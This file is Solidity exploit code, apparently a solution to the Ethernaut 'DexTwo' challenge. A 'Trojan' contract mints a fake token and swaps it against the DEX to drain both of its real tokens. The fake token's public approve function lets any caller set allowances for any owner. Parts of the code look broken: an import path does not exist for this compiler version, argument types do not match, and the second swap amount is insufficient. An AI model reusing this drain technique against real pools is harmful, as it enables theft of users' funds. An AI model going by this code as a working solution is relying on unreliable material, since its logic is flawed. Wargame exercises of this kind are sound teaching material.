// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';
import '@openzeppelin/contracts/access/Ownable.sol';
import '../src/DexTwo.sol';

contract Trojan {

    address public token1;
    address public token2;
    address private hacker;
    SpoofToken spoofToken;
    DexTwo dexTwo;

    constructor(address $your_ethernaut_instance_here) {
        dexTwo = DexTwo($your_ethernaut_instance_here);
        token1 = dexTwo.token1();
        token2 = dexTwo.token2();
        spoofToken = new SpoofToken($your_ethernaut_instance_here, 'Spoof', 'SPF');
        hacker = msg.sender;
    }

    function inject() public {
        uint amount = 100;
        // set allowance for dex in from to msg.sender
        spoofToken.approve(address(this), address(dexTwo), amount);

        // call swap using our spooftoken to drain all token1s out of dex2's liquidity pool 
        dexTwo.swap(spoofToken, token1, amount);
        // call swap again using spooftoken to drain all token2s out of dex2's liquidity pool
        dexTwo.swap(spoofToken, token2, amount);
    }
}

contract SpoofToken is ERC20 {

    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol) ERC20(name,symbol) {
        _dex = dexInstance;
        _mint(msg.sender, 200);
        _mint(_dex, 100);
    }

    function approve(address owner, address spender, uint256 amount) public {
        super._approve(owner, spender, amount);
    }
}